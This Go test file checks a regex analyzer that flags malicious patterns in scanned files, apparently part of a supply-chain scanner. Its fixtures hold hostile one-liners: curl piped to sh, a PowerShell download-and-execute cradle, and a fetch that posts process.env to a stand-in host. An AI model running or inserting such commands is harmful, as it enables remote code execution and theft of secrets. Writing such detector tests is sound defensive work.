package analyze

import (
	"strings"
	"testing"
)

func analyzeOneFile(t *testing.T, relPath, content string) []Finding {
	t.Helper()
	files := []ScannedFile{{RelPath: relPath, Content: content, Lines: splitLines(content)}}
	findings, err := regexAnalyzer{}.Analyze(files)
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}
	return findings
}

func splitLines(s string) []string {
	var lines []string
	start := 0
	for i, r := range s {
		if r == '\n' {
			lines = append(lines, s[start:i])
			start = i + 1
		}
	}
	lines = append(lines, s[start:])
	return lines
}

func TestRegexAnalyzerPatterns(t *testing.T) {
	tests := []struct {
		name    string
		path    string
		content string
		wantCat string
		wantSev Severity
	}{
		{"packer signature", "a.js", "eval(function(p,a,c,k,e,d){return p})", "obfuscation", Critical},
		{"function ctor", "a.js", "const f = new Function('return 1');", "obfuscation", High},
		{"global stash", "a.js", "global['x']=require;", "obfuscation", High},
		{"curl pipe shell", "install.sh", "curl -sSL https://x.example/i.sh | sh", "download-exec", High},
		{"python shell exec", "setup.py", "subprocess.run(cmd, shell=True)", "download-exec", Medium},
		{"discord webhook", "a.js", "https://discord.com/api/webhooks/123/abc", "exfil-channel", Medium},
		{"persistence crontab", "a.sh", "crontab -e", "persistence", High},
		{"recon userinfo", "a.js", "const u = os.userInfo();", "recon", Info},
		{"bulk env dump", "a.js", "send(JSON.stringify(process.env));", "secrets", Medium},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := analyzeOneFile(t, tt.path, tt.content)
			var found *Finding
			for i := range findings {
				if findings[i].Category == tt.wantCat {
					found = &findings[i]
					break
				}
			}
			if found == nil {
				t.Fatalf("expected a %s finding, got: %+v", tt.wantCat, findings)
			}
			if found.Severity != tt.wantSev {
				t.Errorf("severity = %s, want %s", found.Severity, tt.wantSev)
			}
		})
	}
}

func TestLOLBinPatternScopedToScriptExtensions(t *testing.T) {
	// The same string in a .js file must NOT trip the Windows LOLBin pattern
	// (scoped to .ps1/.bat/.cmd/.vbs); in a .ps1 file it must.
	jsFindings := analyzeOneFile(t, "notes.js", "// see: IEX (New-Object Net.WebClient).DownloadString(url)")
	for _, f := range jsFindings {
		if f.Category == "download-exec" {
			t.Errorf("LOLBin pattern should not apply outside script extensions, got %+v", f)
		}
	}

	psFindings := analyzeOneFile(t, "run.ps1", "IEX (New-Object Net.WebClient).DownloadString('http://x')")
	found := false
	for _, f := range psFindings {
		if f.Category == "download-exec" {
			found = true
		}
	}
	if !found {
		t.Error("expected LOLBin pattern to fire in a .ps1 file")
	}
}

func TestObfuscatorFingerprintRequiresRepeats(t *testing.T) {
	// A single incidental match is not evidence.
	single := analyzeOneFile(t, "a.js", "const _0xabcd = 1;")
	for _, f := range single {
		if strings.Contains(f.Message, "javascript-obfuscator") {
			t.Errorf("a single _0x-style identifier must not trip the fingerprint, got %+v", f)
		}
	}

	var repeated string
	for i := 0; i < obfuscatorHexIdentThreshold; i++ {
		repeated += "var _0xa" + string(rune('0'+i)) + "b1=1;\n"
	}
	findings := analyzeOneFile(t, "a.js", repeated)
	found := false
	for _, f := range findings {
		if f.Category == "obfuscation" && f.Analyzer == "regex" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected the obfuscator fingerprint to fire with %d repeats, got: %+v", obfuscatorHexIdentThreshold, findings)
	}
}

func TestNetworkSecretsCoOccurrence(t *testing.T) {
	content := "fetch('https://x.example', {body: JSON.stringify(process.env)});"
	findings := analyzeOneFile(t, "a.js", content)
	found := false
	for _, f := range findings {
		if f.Category == "network" {
			found = true
			if f.Severity != High {
				t.Errorf("expected High severity, got %s", f.Severity)
			}
		}
	}
	if !found {
		t.Errorf("expected a network co-occurrence finding, got: %+v", findings)
	}
}

func TestNetworkAloneInOrdinaryFileIsNotFlagged(t *testing.T) {
	content := "async function load() { return fetch('/api/data'); }"
	findings := analyzeOneFile(t, "app.js", content)
	for _, f := range findings {
		if f.Category == "network" || f.Category == "network-config" {
			t.Errorf("a plain fetch with no secrets marker and outside a tooling config should not be flagged, got %+v", f)
		}
	}
}

func TestStage2FetchExec(t *testing.T) {
	content := "const p = await fetch(url); fs.chmod(p, 0o755); child_process.exec(p);"
	findings := analyzeOneFile(t, "a.js", content)
	found := false
	for _, f := range findings {
		if f.Category == "stage2" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected a stage2 fetch-then-exec finding, got: %+v", findings)
	}
}
